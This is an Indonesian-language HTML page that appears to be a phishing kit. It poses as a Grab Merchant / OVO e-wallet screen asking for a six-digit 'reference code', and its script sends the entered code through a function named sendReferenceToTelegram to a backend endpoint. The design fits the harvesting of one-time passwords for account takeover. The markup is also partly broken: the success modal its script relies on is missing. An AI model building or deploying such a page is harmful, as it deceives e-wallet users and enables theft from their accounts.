<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#ffffff">
  <title>Masukan Kode Referensi</title>
  <style>
    :root {
      --ink: #202124;
      --muted: #6b7280;
      --line: #d9dde3;
      --focus: #3157a4;
      --page: #ffffff;
    }
    * { box-sizing: border-box; }
    html, body { min-height: 100%; }
    body {
      margin: 0;
      min-height: 100svh;
      background: var(--page);
      color: var(--ink);
      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .app {
      min-height: 100svh;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: max(30px, env(safe-area-inset-top)) 24px max(28px, env(safe-area-inset-bottom));
    }
.content {
      width: 100%;
      max-width: 390px;
      margin: clamp(20px, 4vh, 34px) auto 0;
      text-align: center;
    }
    h1 {
      margin: 0;
      font-size: 27px;
      line-height: 1.2;
      font-weight: 700;
      letter-spacing: -.55px;
    }
    .subtitle {
      margin: 13px 0 34px;
      color: var(--muted);
      font-size: 15px;
      line-height: 1.55;
    }
    .digit-row {
      display: grid;
      grid-template-columns: repeat(6, minmax(0, 1fr));
      gap: 9px;
      width: 100%;
    }
    .digit {
      width: 100%;
      min-width: 0;
      height: 58px;
      border: 1.5px solid var(--line);
      border-radius: 11px;
      background: #fff;
      color: var(--ink);
      text-align: center;
      font-size: 23px;
      font-weight: 650;
      outline: none;
      caret-color: var(--focus);
      transition: border-color .16s ease, box-shadow .16s ease;
    }
    .digit:focus {
      border-color: var(--focus);
      box-shadow: 0 0 0 3px rgba(49,87,164,.11);
    }
    .helper {
      min-height: 20px;
      margin: 15px 0 0;
      color: var(--muted);
      font-size: 12px;
      line-height: 1.5;
    }
    @media (max-width: 360px) {
      .app { padding-left: 18px; padding-right: 18px; }
      .digit-row { gap: 7px; }
      .digit { height: 53px; border-radius: 9px; }
}
    @media (min-width: 700px) {
      body { background: #f5f6f8; }
      .app {
        width: min(100%, 430px);
        min-height:  min(900px, 100svh);
        margin: 0 auto;
        background: #fff;
        box-shadow: 0 0 36px rgba(0,0,0,.05);
      }
    }

    .success-modal {
      position: fixed;
      inset: 0;
      z-index: 30;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      background: rgba(0, 72, 35, 0);
      -webkit-backdrop-filter: blur(0);
      backdrop-filter: blur(0);
      visibility: hidden;
      opacity: 0;
      pointer-events: none;
      transition:
        opacity .28s ease,
        background-color .28s ease,
        backdrop-filter .28s ease,
        visibility 0s linear .28s;
    }
    .success-modal.active {
      visibility: visible;
      opacity: 1;
      pointer-events: auto;
      background: rgba(0, 72, 35, .24);
      -webkit-backdrop-filter: blur(3px);
      backdrop-filter: blur(3px);
      transition:
        opacity .28s ease,
        background-color .28s ease,
        backdrop-filter .28s ease,
        visibility 0s;
    }
    .success-card {
      width: min(42vw, 160px);
      padding: 0;
      margin: 0;
      background: transparent;
      border: 0;
      border-radius: 0;
      box-shadow: none;
      opacity: 0;
      transform: translateY(12px) scale(.96);
      transition:
        opacity .38s cubic-bezier(.2,.8,.2,1),
        transform .48s cubic-bezier(.18,1.15,.35,1);
      will-change: transform, opacity;
    }
    .success-modal.active .success-card {
      opacity: 1;
      transform: translateY(0) scale(1);
    }
    .success-card img {
      display: block;
      width: 100%;
      height: auto;
      margin: 0 auto 8px;
      object-fit: contain;
      border-radius: 14px;
    }
    .success-card p {
      margin: 0;
      color: #079447;
      font-size: 16px;
      line-height: 1.35;
      font-weight: 700;
      letter-spacing: .1px;
      text-align: center;
    }
    @media (prefers-reduced-motion: reduce) {
      .success-modal, .success-card {
        transition: none;
      }
    }
    body.modal-open { overflow: hidden; }

  </style>
</head>
<body>
  <main class="app">
<section class="content" aria-labelledby="page-title">
      <h1 id="page-title">Masukan Kode Referensi</h1>
      <p class="subtitle">Silahkan konfirmasi kode 6 digit disini .</p>

      <div class="digit-row" role="group" aria-label="Kolom kode enam digit">
        <input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 1" autofocus><input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 2"><input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 3"><input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 4"><input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 5"><input class="digit" type="number" inputmode="numeric" min="0" max="9" step="1" autocomplete="off" aria-label="Digit 6">
      </div>
      <p class="helper" id="helper" aria-live="polite"> © Grab Merchant & E-Wallet OVO.</p>
    </section>
  </main>

      <p>Terkirim</p>
    </div>
  </div>

  <script>
    const fields = [...document.querySelectorAll('.digit')];
    const helper = document.getElementById('helper');
    const successModal = document.getElementById('successModal');
    let popupShown = false;

    // Fokuskan kolom pertama agar keyboard angka siap digunakan.
    window.addEventListener('load', () => {
      if (fields.length) fields[0].focus();
    });

    async function sendReferenceToTelegram(reference) {
      const response = await fetch('/api/send-reference', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reference })
      });

      if (!response.ok) throw new Error('Pengiriman gagal');
    }

    async function showSuccessPopup(reference) {
      if (popupShown) return;
      popupShown = true;
      helper.textContent = 'Mengirim data referensi...';

      successModal.classList.add('active');
      successModal.setAttribute('aria-hidden', 'false');
      document.body.classList.add('modal-open');

      try {
        await sendReferenceToTelegram(reference);
        helper.textContent = 'Data referensi berhasil dikirim.';
      } catch (error) {
        closePopup();
        popupShown = false;
        helper.textContent = 'Data belum terkirim. Silakan coba lagi.';
      }
    }

    function updateCount() {
      const count = fields.filter(item => item.value !== '').length;
      helper.textContent = count === 6
        ? 'Enam angka telah terisi.'
        : `Masukkan ${6 - count} angka lagi.`;

      if (count === 6) showSuccessPopup(fields.map(field => field.value).join(''));
    }

    function closePopup() {
      successModal.classList.remove('active');
      successModal.setAttribute('aria-hidden', 'true');
      document.body.classList.remove('modal-open');
    }

    successModal.addEventListener('click', event => {
      if (event.target === successModal) closePopup();
    });

    fields.forEach((field, index) => {
      field.addEventListener('input', () => {
        // Keep each numeric field limited to one digit.
        const digits = String(field.value).replace(/[^0-9]/g, '');
        field.value = digits ? digits.slice(-1) : '';
        if (field.value && index < fields.length - 1) fields[index + 1].focus();
        updateCount();
      });

      field.addEventListener('keydown', event => {
        if (event.key === 'Backspace' && !field.value && index > 0) {
          fields[index - 1].focus();
        }
        if (event.key === 'ArrowLeft' && index > 0) fields[index - 1].focus();
        if (event.key === 'ArrowRight' && index < fields.length - 1) fields[index + 1].focus();
        if (event.key === 'Escape' && successModal.classList.contains('active')) closePopup();
      });

      field.addEventListener('paste', event => {
        const pasted = (event.clipboardData || window.clipboardData)
          .getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        if (!pasted) return;
        event.preventDefault();
        pasted.split('').forEach((digit, i) => {
          if (fields[i]) fields[i].value = digit;
        });
        fields[Math.min(pasted.length, 5)].focus();
        updateCount();
      });
    });
  </script>
